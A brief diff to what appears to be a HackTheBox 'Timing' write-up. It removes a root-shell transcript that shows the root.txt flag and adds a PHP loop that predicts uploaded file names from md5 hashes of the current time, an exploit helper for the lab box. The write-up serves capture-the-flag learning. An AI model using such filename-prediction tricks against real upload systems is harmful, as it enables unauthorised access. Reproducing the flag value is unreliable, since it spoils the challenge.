@@ -1,6 +1,15 @@
-```root@timing:~# id && hostname
-uid=0(root) gid=0(root) groups=0(root)
-timing
-root@timing:~# cat root.txt
-fb2827cee92d1d556e851f18433fa33c
-root@timing:~#```
+php```3cat@kali:~/Desktop/HTB/Timing$ cat timingboi.php
+<?php
+while(true){
+$file_hash = uniqid();
+$file_name = "cat.jpg";
+
+$payload = md5('$file_hash' . time()) . '_' . $file_name;
+echo date("D M j G:i:s T Y");
+echo " = ";
+echo $payload;
+echo "\n";
+sleep(1);
+}
+
+?>```
